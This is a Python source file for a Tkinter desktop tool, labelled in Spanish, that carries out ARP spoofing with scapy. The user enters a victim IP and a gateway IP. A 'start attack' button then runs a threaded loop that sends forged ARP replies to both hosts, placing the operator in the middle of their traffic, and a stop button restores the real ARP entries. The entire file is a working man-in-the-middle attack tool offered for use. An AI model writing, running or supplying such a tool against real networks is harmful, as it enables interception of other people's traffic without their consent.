from tkinter import *
import scapy.all as scapy
import time
import threading

raiz = Tk()

#________________Logica___________________

interval = 4
estatus = "True"

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


def startspoofing():
    global estatus
    estatus = "True"
    try:
        while estatus=="True":
            lbl4.config(text="Atacando...")
            spoof(txt1.get(),txt2.get())
            spoof(txt2.get(), txt1.get())
            time.sleep(interval)
    except Exception as e:
            lbl4.config(text=f"Error: {e}")
            restore(txt2.get(), txt1.get())
            restore(txt1.get(),txt2.get())
            estatus="False"
    finally:
         lbl4.config(text="Ataque detenido")
 
def startspoofing_thread():
    threading.Thread(target=startspoofing, daemon=True).start()
        
def stopspoofing():
     global estatus
     estatus="False"
     lbl4.config(text="Se ha detenido el ataque")
     restore(txt2.get(), txt1.get())
     restore(txt1.get(),txt2.get())
     

#___________________GUI_________________________________
raiz.title("ARPspoofer_by_oldaherfo")

#para hacer que no se pueda redimensionar la ventana:
raiz.resizable(1,1)

#para cambiar el icono:
raiz.iconbitmap(r"C:\Users\user\Desktop\Python Products\arpicon.ico")

#para cambiar las dimensiones por defecto:
raiz.geometry("550x400")

#para cambiar el color de fondo:
raiz.config(background="white")

#______________________Elementos____________________________

lbl0=Label(raiz, text="""
 _   _   _                      
     /_/ /_/ /_/  _  _  _  _ _/| _  _
      / / / \ /     _\  /_//_//_//  /_'/ 
                /                 
 """,bg="white")

lbl1=Label(raiz, text="Inserte la direccion IP de la victima:", bg="white", justify="left")
txt1=Entry(raiz, background="gray")

lbl2=Label(raiz, text="Inserte la direccion IP del gateway:", bg="white", justify="left")
txt2=Entry(raiz, background="gray")

boton1=Button(raiz,text="Comenzar Ataque", command=startspoofing_thread)

boton2=Button(raiz, text="Detener Ataque", command=stopspoofing)

lbl3=Label(raiz, text="Resultado:", bg="white", justify="left")
lbl4 = Label(raiz, bg="white")
lbl5 = Label(raiz, text="Creado por oldaherfo - 2024", bg="white")

#______________________Posiciones____________________________
lbl0.pack(pady=10)
lbl1.pack()
txt1.pack(pady=6)
lbl2.pack()
txt2.pack(pady=6)
boton1.pack(pady=6)
boton2.pack(pady=6)
lbl3.pack(pady=6)
lbl4.pack()
lbl5.pack(pady=10)


raiz.mainloop()